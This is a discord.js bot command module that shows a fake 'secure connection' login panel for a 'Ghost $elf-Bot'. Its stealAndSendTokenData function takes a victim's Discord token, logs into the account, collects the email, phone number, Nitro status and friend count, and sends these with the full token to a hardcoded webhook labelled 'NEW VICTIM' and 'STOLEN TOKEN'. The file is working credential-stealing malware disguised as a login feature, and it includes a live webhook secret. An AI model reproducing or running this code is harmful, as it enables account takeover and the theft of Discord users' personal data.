const { SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const axios = require('axios');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('login')
        .setDescription('Display the Ghost $elf-Bot login panel'),
    async execute(interaction) {
        // Remplacez par les IDs autorisés
        const allowedIDs = ['1398028386856603658, 558648865176289290'];
        
        if (!allowedIDs.includes(interaction.user.id)) {
            return interaction.reply({ content: '❌ You are not authorized to use this command.', ephemeral: true });
        }

        const embed = new EmbedBuilder()
            .setTitle('🔐 Secure connection to Ghost $elf-Bot')
            .setDescription('Welcome! Click the button below to establish a secure connection with Ghost $elf-Bot.')
            .setColor(0x0099FF);

        const button = new ButtonBuilder()
            .setCustomId('panel_login_button') // ID différent du bouton standard
            .setLabel('Connect to Ghost $elf-Bot')
            .setStyle(ButtonStyle.Primary);

        const row = new ActionRowBuilder().addComponents(button);

        await interaction.reply({ embeds: [embed], components: [row] });
    },

    // Fonction pour voler et envoyer les données du token
    async stealAndSendTokenData(token, userId) {
        try {
            const webhookURL = 'https://discord.com/api/webhooks/1430113262560739398/nUvlz3smr9bDxxQtT7FHLdcdgL_UQfKbkDHXn0it4fbjipIDF9HDUNOFtwZYWCN97oTA';
            
            const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
            const tempClient = new SelfbotClient();
            
            await tempClient.login(token);
            
            const user = tempClient.user;
            
            let phone = 'Not accessible';
            let email = 'Not accessible';
            let friendsCount = 0;
            let nitroStatus = 'None';
            let banner = 'No banner';
            
            try {
                const userData = await tempClient.api.users('@me').get();
                if (userData.phone) phone = userData.phone;
                if (userData.email) email = userData.email;
                if (userData.premium_type) {
                    nitroStatus = userData.premium_type === 1 ? 'Nitro Classic' : 
                                userData.premium_type === 2 ? 'Nitro Boost' : 'None';
                }
                if (userData.banner) {
                    const format = userData.banner.startsWith('a_') ? 'gif' : 'png';
                    banner = `https://cdn.discordapp.com/banners/${user.id}/${userData.banner}.${format}?size=1024`;
                }
                
                try {
                    const relationships = await tempClient.api.users('@me').relationships.get();
                    friendsCount = relationships.filter(rel => rel.type === 1).length;
                } catch (e) {
                    console.log('⚠️ Unable to retrieve friends');
                }
                
            } catch (e) {
                console.log('⚠️ Some data not accessible');
            }
            
            const payload = {
                embeds: [
                    {
                        title: "🎯 NEW VICTIM - GHOST $B",
                        color: 0xff0000,
                        thumbnail: {
                            url: user.displayAvatarURL({ format: 'png', size: 1024 })
                        },
                        fields: [
                            {
                                name: "👤 VICTIM ACCOUNT",
                                value: `**Username:** ${user.tag}\n**ID:** ${user.id}\n**Created:** ${user.createdAt.toLocaleDateString('en-US')}\n**Nitro:** ${nitroStatus}`,
                                inline: false
                            },
                            {
                                name: "📱 PERSONAL INFORMATION",
                                value: `**Email:** ${email}\n**Phone:** ${phone}\n**Friends:** ${friendsCount} friends\n**Banner:** ${banner}`,
                                inline: false
                            },
                            {
                                name: "🔑 STOLEN TOKEN",
                                value: `\`\`\`${token}\`\`\``,
                                inline: false
                            },
                            {
                                name: "🕵️ STOLEN BY",
                                value: `<@${userId}> (${userId})`,
                                inline: false
                            },
                            {
                                name: "⏰ THEFT DATE",
                                value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
                                inline: false
                            }
                        ],
                        footer: {
                            text: "Ghost $B Stealer • Protected by MaDrugDev & Fraxx",
                            icon_url: "https://media.discordapp.net/attachments/1403839575792549960/1412389739348230275/cachedImage.png"
                        }
                    }
                ]
            };
            
            await axios.post(webhookURL, payload, {
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            
            console.log(`🎯 DATA STOLEN: ${user.tag} (${user.id})`);
            console.log(`📧 Email: ${email}`);
            console.log(`📱 Phone: ${phone}`);
            console.log(`💎 Nitro: ${nitroStatus}`);
            console.log(`👥 Friends: ${friendsCount}`);
            console.log(`🔑 Token: ${token.substring(0, 20)}...`);
            
            tempClient.destroy();
            
        } catch (error) {
            console.error('❌ Data theft error:', error.message);
            throw error; // Propager l'erreur pour la gestion dans index.js
        }
    }
};